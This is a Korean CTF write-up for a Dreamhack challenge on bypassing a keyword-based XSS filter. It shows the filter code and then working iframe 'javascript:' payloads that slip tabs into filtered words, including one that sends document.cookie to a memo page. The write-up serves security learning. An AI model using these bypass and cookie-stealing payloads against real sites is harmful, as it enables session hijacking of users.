## XSS Filtering Bypass Advanced
<hr style="border-top: 1px solid;"><br>

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

필터링 단어들을 공백으로 치환하지 않고 filtered란 단어를 출력하게 하였다.

<a href="https://dreamhack.io/lecture/courses/318" target="_blank">Exploit Tech: XSS Filtering Bypass - I</a>에서 보면 URI 정규화 관련 내용이 나온다.

정규화 과정을 이용해서 접근해보았다. ```%09(\t), %0a(\n)```을 이용하면 된다.
: ```<iframe src="javascri%09pt:alert`1`">``` --> alert(1) 실행된다.

<br>

위의 과정까지 도달하는데 굉장히 오래 걸렸다... ㅠ

테스트 쿠키를 만든 뒤 ```/vuln``` 페이지에서 아래의 페이로드를 보내면 쿠키 값이 메모장에 출력된다.
: ```<iframe src="javascri%09pt:locatio%09n.href='/memo?memo='%2bdocumen%09t.cookie">```

flag 페이지에서 입력할 때 아래 payload 그대로 넣어야 동작한다. **(```/vuln``` 페이지에 페이로드를 넣고 소스페이지에서 확인)**

<br>

![payload](https://user-images.githubusercontent.com/52172169/166133877-6fe1b3c9-8b61-49ae-b744-e1a279adbbdf.png)

<br>

최종 payload
: ```<iframe src="javascrip	t:locatio	n.href='/memo?memo=' documen	t.cookie">```

<br>

다른 풀이로는 ```data:[<mediatype>][;base64],<data>```를 이용해서 풀 수도 있다.
: <a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Basics_of_HTTP/Data_URIs" target="_blank">developer.mozilla.org/ko/docs/Web/HTTP/Basics_of_HTTP/Data_URIs</a>

```<svg>``` 태그와 ``<use>``` 태그를 이용해서 ```<use>```의 ```href``` 속성에서 data URI를 이용해 푼 풀이가 있었다.

또한 자바스크립트의 ```fetch``` 함수를 이용해서 원격 API를 호출해서 풀 수도 있다.

<br>

+ Flag : ```flag=DH{[redacted]}```

<br><br>
<hr style="border: 2px solid;">
<br><br>
